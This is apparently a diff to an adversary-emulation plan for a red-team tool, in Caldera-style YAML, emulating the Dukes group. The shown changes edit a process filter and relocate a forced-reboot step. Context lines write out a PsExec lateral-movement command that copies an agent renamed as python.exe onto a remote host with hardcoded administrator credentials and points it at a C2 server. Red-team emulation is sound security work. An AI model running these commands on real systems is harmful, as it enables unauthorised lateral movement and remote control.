@@ -1096,14 +1096,14 @@
       psh,pwsh:
         command: |
           Move-item "C:\Users\Public\sandcat.exe" "\\DESKTOP-22K14OG\C$\Windows\Temp\python.exe" -Force; Set-Location -Path "C:\Program Files\SysInternalsSuite"; .\PsExec64.exe \\DESKTOP-22K14OG -u Administrator -p Password123! -accepteula -i 0 -d "C:\Windows\Temp\python.exe" -group pivot -server "http://192.168.1.45:443";
-          tasklist /S DESKTOP-22K14OG /U Administrator /P Password123! /FI "IMAGENAME eq python.exe";
+          tasklist /S DESKTOP-22K14OG /U Administrator /P Password123! /FI "IMAGENAME eq python.exe -originLinkID #{origin_link_id}";
         payloads:
         - sandcat.go-windows-upx
   executors:
   - name: powershell
     command: |
       Move-item "C:\Users\Public\sandcat.exe" "\\DESKTOP-22K14OG\C$\Windows\Temp\python.exe" -Force; Set-Location -Path "C:\Program Files\SysInternalsSuite"; .\PsExec64.exe \\DESKTOP-22K14OG -u Administrator -p Password123! -accepteula -i 0 -d "C:\Windows\Temp\python.exe" -group pivot -server "http://192.168.1.45:443";
-      tasklist /S DESKTOP-22K14OG /U Administrator /P Password123! /FI "IMAGENAME eq python.exe";
+      tasklist /S DESKTOP-22K14OG /U Administrator /P Password123! /FI "IMAGENAME eq python.exe -originLinkID #{origin_link_id}";
 
 - id: a1b2c3d4-e5f6-7890-abcd-ef1234567891
   name: Hostname Discovery 1
@@ -1372,29 +1372,6 @@
 
 # Step 10 - Persistant Execution
 
-- id: 4b2e9574-b1a7-4b38-95b2-6054ded9c4fe
-  name: Scheduled Task
-  description: Reboot the machine to aid in peristence callbacks
-  tactic: impact
-  technique:
-    attack_id: T1529
-    name: "System Shutdown/Reboot"
-  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
-  procedure_group: procedure_impact
-  procedure_step: "10.A.2"
-  platforms:
-    windows:
-      psh,pwsh:
-        command: |
-          write-host "[*] Restarting Computer";
-          Restart-Computer -Force;
-
-  executors:
-  - name: powershell
-    command: |
-      write-host "[*] Restarting Computer";
-      Restart-Computer -Force;
-
 - id: a1b2c3d4-e5f6-7890-abcd-ef1234567895
   name: Hostname Discovery 5
   description: Dynamically captures the host's name
@@ -1540,3 +1517,27 @@
       Start-Sleep 3;
       if (Get-Process mstsc -ErrorAction SilentlyContinue) { taskkill /F /IM mstsc.exe };
       exit 0;
+
+
+- id: 4b2e9574-b1a7-4b38-95b2-6054ded9c4fe
+  name: Scheduled Task
+  description: Reboot the machine to aid in peristence callbacks
+  tactic: impact
+  technique:
+    attack_id: T1529
+    name: "System Shutdown/Reboot"
+  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
+  procedure_group: procedure_impact
+  procedure_step: "10.A.2"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          write-host "[*] Restarting Computer";
+          Restart-Computer -Force;
+
+  executors:
+  - name: powershell
+    command: |
+      write-host "[*] Restarting Computer";
+      Restart-Computer -Force;
